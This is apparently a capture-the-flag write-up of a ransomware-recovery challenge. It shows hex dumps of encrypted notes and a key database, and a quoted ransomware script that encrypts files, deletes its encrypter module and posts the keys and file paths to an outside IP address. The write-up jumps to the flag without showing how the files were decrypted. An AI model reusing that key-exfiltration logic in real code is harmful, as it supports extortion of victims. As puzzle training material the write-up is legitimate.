# Crowdstrike Adversary Quest 2022 / Catapult Spider / #3 So Much Bits

## Challenge Description

Unfortunately, after infection, the ransomware managed to encrypt all the customer's important files. Thanks to your help, we were able to determine the infection path and delete the control panel as well as the running ransomware. This also enabled us to gain access to the files on the disk of an infected Linux host. You can find the restored files attached. They are still encrypted, though, but at least the ransomware left some files. Please figure out whether there is a chance to decrypt the files without paying the ransom.

## Challenge Files

```console
$ ls -laR       
.:
total 5
drwxr-xr-x 1 501 dialout  192 Jul 31 10:48 .
drwxr-xr-x 1 501 dialout  288 Jul 31 10:44 ..
-rw-r--r-- 1 501 dialout  191 Jul 18 19:37 keys.db
drwxr-xr-x 1 501 dialout  128 Jul 31 10:48 notes
-rw-r--r-- 1 501 dialout  785 Jul 18 19:37 such_note_much_ransom.txt
-rwxr-xr-x 1 501 dialout 1084 Jul 31 10:46 victim_script.py

./notes:
total 2
drwxr-xr-x 1 501 dialout 128 Jul 31 10:48 .
drwxr-xr-x 1 501 dialout 192 Jul 31 10:48 ..
-rw-r--r-- 1 501 dialout 100 Jul 18 19:37 grocery.txt.enc
-rw-r--r-- 1 501 dialout 165 Jul 18 19:37 todo.txt.enc
```

### File *such_note_much_ransom.txt*

A ransomnote written in doge speech.

- Contact mail address is `AllYourDogeAreBelongToDoge@protonmail.com`.
- Dogecoin wallet `DJR6L7PeDcen9GFzoJnPioRd1tV3wt9X3p`.

### File *keys.db*

Seems to be binary, structure yet unknown.

```console
$ xxd keys.db                                                                  
00000000: 2c00 0000 746f 646f 2e74 7874 2e65 6e63  ,...todo.txt.enc
00000010: e752 8b60 7533 30a0 ba74 e24e 4d2c ef86  .R.`u30..t.NM,..
00000020: 8f5a 7601 1d5b 5bd5 f7dd c6f2 5fdb 1b42  .Zv..[[....._..B
00000030: 0000 0000 2200 0000 2f68 6f6d 652f 6368  ....".../home/ch
00000040: 616c 6c65 6e67 652f 6e6f 7465 732f 746f  allenge/notes/to
00000050: 646f 2e74 7874 2e65 6e63 0000 0000 2c00  do.txt.enc....,.
00000060: 0000 6365 7279 2e74 7874 2e65 6e63 b02f  ..cery.txt.enc./
00000070: d231 39e8 386d 2dd9 78dd a744 226c 46a9  .19.8m-.x..D"lF.
00000080: 97c6 4fa0 a269 fe23 d38d 9bb4 e602 0000  ..O..i.#........
00000090: 0000 2500 0000 2f68 6f6d 652f 6368 616c  ..%.../home/chal
000000a0: 6c65 6e67 652f 6e6f 7465 732f 6772 6f63  lenge/notes/groc
000000b0: 6572 792e 7478 742e 656e 6300 0000 00    ery.txt.enc....
```

### File *notes/grocery.txt.enc*

Likely one of the restored encrypted files.

```console
$ xxd grocery.txt.enc 
00000000: cc2d a24c fa37 2d8b 2006 27f5 c46a 7f6c  .-.L.7-. .'..j.l
00000010: b6bb edc9 4082 7ff3 6120 6478 03dd f66b  ....@...a dx...k
[...]
```

### File *notes/todo.txt.enc*

And another restored but still encrypted file.

```console
$ xxd todo.txt.enc   
00000000: cc2d a24c fa37 2d8b 2006 27f5 4700 d5eb  .-.L.7-. .'.G...
00000010: d878 4fc6 fbd9 5eae 4fd3 e0c6 117d 3092  .xO...^.O....}0.
[...]
```

What directly gets our attention is that the first 12 bytes (`cc2d a24c fa37 2d8b 2006 27f5`) are the same in both encrypted files.

Could be a re-use of crypto material, but that's still speculation here.

### File *victim_script.py*

This is likely the script that was used to encrypt the above files.

## Analysis of the Encryption Script

```python=
[...]
from encrypter import *

def get_encrypted_key_db(data):
    encoded_data = bytearray()
    for _, key, path in data:
        encoded_data += len(key).to_bytes(4, byteorder='little')
        encoded_data += key
        encoded_data += b"\x00\x00\x00\x00"
        encoded_data += len(path).to_bytes(4, byteorder='little')
        encoded_data += f"{path}".encode()
        encoded_data += b"\x00\x00\x00\x00"
    res = requests.post("http://116.202.161.100:57689/encrypt_db", data=b64encode(encoded_data))
    return b64decode(res.text)

def write_key_db(data):
    with open("keys.db", "wb") as h:
        h.write(data)

def main():
    paths = generate_path_list()
    # Encrypt data with military-grade AES-GCM
    encrypted_data = encrypt_files(paths)
    # Delete encryption module to anger security researchers
    os.remove("encrypter.py")
    write_files(encrypted_data)
    key_db = get_encrypted_key_db(encrypted_data)
    write_key_db(key_db)

if __name__ == "__main__":
    main()
```



## Now it's Flag Time!

Flag: **CS{d0g3_s0_n1c3_such_4m4z3}**
